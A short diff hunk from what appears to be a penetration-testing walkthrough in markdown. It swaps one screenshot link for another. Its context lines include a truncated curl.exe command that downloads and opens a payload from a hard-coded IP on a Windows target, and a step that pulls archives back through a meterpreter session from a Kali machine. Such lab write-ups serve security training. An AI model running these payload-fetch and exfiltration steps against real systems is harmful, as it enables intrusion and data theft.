@@ -95,7 +95,7 @@ On Windows download the payload and open it: ```curl.exe http://192.169.92.136:8
 
 <img width="1140" height="462" alt="image" src="https://github.com/user-attachments/assets/44fe1b36-557d-4c8c-934e-8b6cc524076b" />
 
-<img width="483" height="229" alt="image" src="https://github.com/user-attachments/assets/9d8837cf-9ad2-4bda-91e2-66b806bd9be8" />
+<img width="476" height="224" alt="image" src="https://github.com/user-attachments/assets/f77b4e0c-a3f5-466a-9e4d-212c6ff79295" />
 
 Now from our kali machine, in the meterpreter session, download the archives.
 
